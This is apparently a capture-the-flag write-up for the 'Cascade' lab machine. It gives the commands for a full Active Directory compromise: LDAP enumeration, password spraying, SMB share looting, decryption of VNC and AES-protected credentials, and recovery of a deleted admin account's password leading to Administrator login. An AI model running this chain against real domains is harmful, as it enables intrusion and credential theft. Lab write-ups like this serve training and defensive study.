# Cascade - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed standard Active Directory services:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  
636/tcp   open  tcpwrapped    
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped    
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
```

### Domain Information
From the scan results, I identified domain information:
```
Domain: cascade.local
Domain Controller: CASC-DC1.cascade.local
```

### LDAP Enumeration
I performed LDAP enumeration to gather information about users and potential credentials:
```bash
python3 windapsearch.py --dc-ip 10.129.139.161 --full -U
```

Then, I searched specifically for password-related attributes:
```bash
python3 windapsearch.py --dc-ip 10.129.139.161 --full -U | grep -ie "pwd\|password"
```

This revealed an interesting attribute:
```
cascadeLegacyPwd: clk0bjVldmE=
```

## Gaining Initial Access

### Credential Discovery and Decoding
The cascadeLegacyPwd attribute appeared to be base64 encoded. I decoded it:
```bash
echo -n "clk0bjVldmE=" | base64 -d
```

This revealed the password: `rY4n5eva`

Initially, I didn't know which user this password belonged to, so I created a list of potential usernames from the LDAP enumeration results and attempted to brute force:
```bash
crackmapexec smb 10.129.139.161 -u users.txt -p 'rY4n5eva'
```

This revealed valid credentials:
- **Username**: r.thompson
- **Password**: rY4n5eva

### SMB Share Enumeration
Using these credentials, I connected to SMB shares:
```bash
smbclient.py cascade.local/r.thompson:'rY4n5eva'@10.129.139.161
```

I discovered several interesting files:
1. Meeting_Notes_June_2018.html
   - Contained information about a 'TempAdmin' account
   - Mentioned that TempAdmin had the same password as the Administrator account
   - This account had been deleted but could potentially be recovered

2. VNC Install.reg
   - Contained registry information for TightVNC Server
   - Included an encrypted password: `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`

### VNC Password Decryption
I used a VNC password decryption tool to decrypt the password:
```bash
python2 vncpasswd.py -d 6bcf2a4b6e5aca0f -H
```

This revealed a new password: `sT333ve2`

## Lateral Movement

### Access as s.smith
I attempted to use the VNC password with user s.smith:
```bash
evil-winrm -i 10.129.139.161 -u s.smith -p 'sT333ve2'
```

This provided access as s.smith.

### Further Enumeration
As s.smith, I connected to SMB to explore additional shares:
```bash
smbclient.py cascade.local/s.smith:'sT333ve2'@10.129.139.161
```

I discovered an Audit$ share containing an SQLite database named Audit.db:
```bash
get Audit.db
```

### Database Analysis
I analyzed the database using SQLite Browser and found a table named 'ldap' containing credential information:
```
Username: ArkSvc
Password: BQO5l5Kj9MdErXx6Q6AGOw==
Domain: cascade.local
```

The password appeared to be encrypted. Simple base64 decoding didn't yield usable results.

### Reverse Engineering the Encryption
I decompiled a related binary found in the Audit share to understand the encryption mechanism. Using ILSpy, I discovered it was using AES encryption with:
```
IV: 1tdyjCbY1Ix49842 (hex: 317464796a4362593149783439383432)
Key: c4scadek3y654321 (hex: 633473636164656b3379363534333231)
```

Using this information, I decrypted the password:
```bash
python3 -c "from Crypto.Cipher import AES; import base64; key=b'c4scadek3y654321'; iv=b'1tdyjCbY1Ix49842'; cipher=AES.new(key,AES.MODE_CBC,iv); print(cipher.decrypt(base64.b64decode('BQO5l5Kj9MdErXx6Q6AGOw==')).decode('utf-8'))"
```

This revealed the credentials:
- **Username**: arksvc
- **Password**: w3lc0meFr31nd

## Privilege Escalation

### AD Recycle Bin Enumeration
I discovered that the arksvc user was a member of the "AD Recycle Bin" group, which allows viewing deleted AD objects. I connected with the new credentials:
```bash
evil-winrm -i 10.129.139.161 -u arksvc -p 'w3lc0meFr31nd'
```

Then used PowerShell to search for deleted objects:
```powershell
Get-ADObject -ldapfilter "(&(ObjectClass=user)(isDeleted=TRUE))" -IncludeDeletedObjects
```

This revealed the deleted TempAdmin account with an interesting attribute:
```
cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
```

### Decoding the Administrator Password
I decoded the discovered base64 string:
```bash
echo -n "YmFDVDNyMWFOMDBkbGVz" | base64 -d
```

This revealed the password: `baCT3r1aN00dles`

According to the earlier notes, TempAdmin shared the same password as Administrator, so I attempted to login as Administrator:
```bash
evil-winrm -i 10.129.139.161 -u Administrator -p 'baCT3r1aN00dles'
```

This provided access as Administrator, successfully completing the challenge.

I verified the access by checking administrative privileges:
```powershell
whoami /all
```